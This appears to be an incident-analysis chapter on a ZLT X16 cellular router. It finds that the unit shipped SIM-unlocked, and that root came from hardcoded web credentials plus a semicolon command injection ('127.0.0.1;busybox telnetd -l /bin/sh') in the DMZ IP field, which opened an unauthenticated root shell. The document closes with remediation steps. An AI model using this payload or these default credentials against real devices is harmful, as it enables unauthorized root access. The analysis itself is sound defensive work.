# 18 — How This Unit Was "Unlocked" (any SIM, root shell)

Two separate questions, two separate answers:

- **"It accepts any SIM"** → this is **factory configuration**, not a hack. No
  evidence of any SIM/NCK unlock procedure.
- **"root is enabled"** → **yes, and it came from the `iptables_dmz_function`
  command injection exactly as suspected**, obtained via hardcoded super-admin web
  credentials.

---

## A. SIM / carrier lock — never locked in the first place

`/productinfo/tzcfg/main_config`, **mtime `Jan 6 1980`** (i.e. never rewritten
since the device's epoch clock — this is the shipped file):

```sh
SYS_LOCK_SIM_SW="0"            # SIM PIN lock: OFF
SYS_LOCK_SIM_INITIAL_PIN="1234"
SYS_LOCK_SIM_CHANGED_PIN="665544"
SYS_LOCK_PHONE_SW="0"          # phone lock: OFF
SYS_LOCK_OPERATOR_SW="0"       # network / operator lock: OFF
SYS_LOCK_OPERATOR_LIST=""      # no allowed-operator whitelist
```

And from `mdlcfg`:

```sh
SYS_UNLOCK_SIM_CODE_ENABLE="0"
SYS_UNLOCK_SIM_NCK_CODE=""      # <-- empty: no unlock code was ever entered
SYS_UNLOCK_NCK_CODE_COUNT="5"
SYS_UNLOCK_PIN_CODE_FOREVER_ENABLE="0"
```

**Conclusion:** the box is not carrier-locked and was never unlocked. The
`OMN247` product config ships with `SYS_LOCK_OPERATOR_SW=0` and an empty
operator list, so it accepts any SIM by design. There is no NCK/SPCK unlock
evidence, no operator whitelist, and the file's timestamp says it was never
touched.

> This matters for the customer conversation: the device is not "cracked" in the
> SIM-lock sense. It is an Ooredoo-Oman-badged SKU that was never network-locked,
> now being used on Pakistani networks.

---

## B. Root — yes, via the `iptables_dmz_function` injection

### The artefact

`/productinfo/tzcfg/iptables/iptables_dmz_function`, **mtime `Oct 27 2025`** —
this is the only file in that directory, and it is the vendor web app's saved
record of the last POST handled by the DMZ-function CGI:

```json
{"enabled":"1",
 "ip":"127.0.0.1;busybox telnetd -l \/bin\/sh",
 "cmd":172,
 "subcmd":6,
 "success":true,
 "method":"POST",
 "sessionId":"bda24badbc70d8d821c500304878fdced90380256d76f5584488ff9021525bf0"}
```

Reading the fields:

| Field | Meaning |
|---|---|
| `method: POST`, `cmd:172`, `subcmd:6` | the DMZ-function *save* handler was invoked |
| `sessionId` present | the *client* sent a session id — **does not prove the server validated it** |
| `ip` | the value the operator typed into the "DMZ IP" field |
| `;` | shell command separator |
| `busybox telnetd -l /bin/sh` | the injected payload |
| `success: true` | the handler ran and reported success |

The handler interpolates the `ip` value into a command executed **as root**. The
semicolon terminates that command and starts a second one, so the router
faithfully spawned a telnet daemon with **no login handler at all**
(`-l /bin/sh` bypasses authentication entirely).

### Confirmed live today

```
$ ps w | grep telnetd
 5231 root  0:04 busybox telnetd -l /bin/sh
$ netstat -lnt | grep :23
tcp  :::23  LISTEN
```

This cannot have come from the firmware's own boot path:

- `/etc/initscripts/start_telnet` starts `telnetd -l /etc/tzscript/telnet_login.sh -p 9876`
  — a **different port**, and with a **login handler**.
- It is gated by `SYS_TELNET_SWITCH`, which is **`0`**.
- Nothing else in `/etc/initscripts/` mentions `telnetd`.

So the running `:23` daemon is uniquely explained by the injected command above.

### How a web session was obtained — hardcoded credentials

`mdlcfg` ships default accounts, **identical on every unit of this model**:

```sh
SYS_USER_LOGIN_NAME="admin"        SYS_USER_LOGIN_PWD="admin"
SYS_SUPER_LOGIN_NAME="superadmin"  SYS_SUPER_LOGIN_PWD="<super-admin-pw-redacted>"
SYS_SENIOR_LOGIN_PWD="admin"
USR_TR069_ACS_USERNAME="acsadmin"
```

`admin/admin` gets you in; `superadmin` / `<super-admin-pw-redacted>` gets you the highest
privilege tier. This super-admin password has been publicly discussed (the
GitHub issue *"ZLT X16 Superadmin"* exists precisely to ask for it), so it is a
fleet-wide secret, not a device secret.

### Full chain

```
admin/admin  or  superadmin/<super-admin-pw-redacted>          <- hardcoded web credentials
        |
   web UI DMZ-function save  (cmd 172, subcmd 6)
        |
   "ip" field interpolated into a root shell command
        |
   "127.0.0.1; busybox telnetd -l /bin/sh"    <- semicolon injection
        |
   unauthenticated root shell on tcp/23
        |
   arbitrary root: edit /etc/passwd, add users, change APN, drop binaries
```

---

## C. What the root shell was actually used for

Not for SIM unlocking — for **retuning the unit to Pakistani networks**.
`/productinfo/tzcfg/web_event_super.log` records privilege-level `[3]` (super)
sessions from `192.168.3.126`:

```
[3] [192.168.3.126] [0] [1980-01-06 04:00:37] - LOGIN - SUCCESS
[1] [192.168.3.126] [0] [1980-01-06 04:01:01] - lock band change - Response Success
[1] [192.168.3.126] [0] [1980-01-06 04:01:09] - LOGOUT - Response Success
[1] [192.168.3.126] [0] [1980-01-06 04:15:28] - AT send - Response Success
[1] [192.168.3.126] [0] [1980-01-06 04:15:52] - Normal reboot - Response Success
```

Corroborated by the runtime "changed from factory" flags in
`/tmp/cmdlib/config-changed-flag-files-dir/`:

```
.USR_LTE_BAND_LOCK_SW      .USR_LTE_LOCK_BAND_MASK
.USR_NR_BAND_LOCK_SW       .USR_NR_LOCK_BAND_MASK
.USR_WCDMA_BAND_LOCK_SW    .USR_WCDMA_LOCK_BAND_MASK
.USR_APN_NAME
```

with current values:

```sh
USR_LTE_BAND_LOCK_SW="1"    USR_LTE_LOCK_BAND_MASK="95"
USR_NR_BAND_LOCK_SW="1"     USR_NR_LOCK_BAND_MASK="20000000018000000081"
```

So the device was band-locked (LTE/NR) and re-APN'd for Pakistan through the
super-admin UI. That is a **configuration** change, not a firmware modification.

---

## D. Was root enabled anywhere else?

| Vector | State | Evidence |
|---|---|---|
| Console/telnet `:23` no-auth root | **YES — from the injection** | `ps`, netstat, `iptables_dmz_function` |
| Vendor telnet `:9876` (with login) | off | `SYS_TELNET_SWITCH=0`, not listening |
| `adbd` (root over USB) | off | `SYS_ADB_SWITCH=0`, not running |
| SSH | **we added it** (doc 10) | `/etc/initscripts/start_ssh` |
| `/etc/passwd` root shell | `/bin/sh` — **stock QTI layout**, not modified | no rootfs copy to diff against, but the layout matches the vendor image |
| Setuid binaries | not enumerated — would need a live sweep | — |

Note there is **no `/system/etc/passwd`** to diff `/etc/passwd` against, so a
byte-level "was passwd tampered with" check is not possible from the filesystem
alone. What can be said: root's shell and uid/gid are the normal QTI values, and
the only *added* accounts are the ones we created (`zlt`).

---

## E. Answer to the question, in one paragraph

The device accepts any SIM because it shipped that way — `SYS_LOCK_OPERATOR_SW=0`
with an empty operator list in a `main_config` whose timestamp has never moved.
It has root because a hardcoded web super-admin account (`superadmin` /
`<super-admin-pw-redacted>`) was used to reach the DMZ-function save handler, whose `ip` field is
interpolated into a root shell command; a semicolon plus `busybox telnetd -l
/bin/sh` turned that into a passwordless root shell on tcp/23 — and the router's
own audit file for that request is still sitting in
`/productinfo/tzcfg/iptables/iptables_dmz_function` with `"success":true`.

---

## F. Recommended remediation

1. **Kill the unauthenticated shell** (it is the actual exposure):
   ```sh
   killall telnetd
   ```
2. **Remove the saved injection artefact AND the persisted config payload.**
   Deleting the file alone is **not sufficient** — the payload is stored in
   `mdlcfg` and re-applied at boot:
   ```
   $ mdlcfg -g TZ_ENABLE_DMZ    -> yes
   $ mdlcfg -g TZ_DMZ_DEST_IP   -> 127.0.0.1;busybox telnetd -l /bin/sh
   ```
   ```sh
   mdlcfg -a TZ_ENABLE_DMZ=no
   mdlcfg -a TZ_DMZ_DEST_IP=127.0.0.1
   mdlcfg -c
   mv /productinfo/tzcfg/iptables/iptables_dmz_function \
      /productinfo/tzcfg/iptables/iptables_dmz_function.disabled
   ```
   Then reboot and confirm `ps w | grep telnetd` is empty. See
   [19](19-vulnerability-assessment.md) §V2.
3. **Change the hardcoded web credentials** — all three tiers:
   ```sh
   mdlcfg -a SYS_USER_LOGIN_PWD='<strong>' \
          -a SYS_SUPER_LOGIN_PWD='<strong>' \
          -a SYS_SENIOR_LOGIN_PWD='<strong>' && mdlcfg -c
   ```
   (back up `main_config` first — see doc 17.)
4. **Keep SSH, drop telnet.** SSH now provides the console with real
   authentication; the no-auth telnet is strictly worse.
5. Consider adding a WAN-side DROP for any management port you keep, and for
   `:8080` (doc 16 §S4).
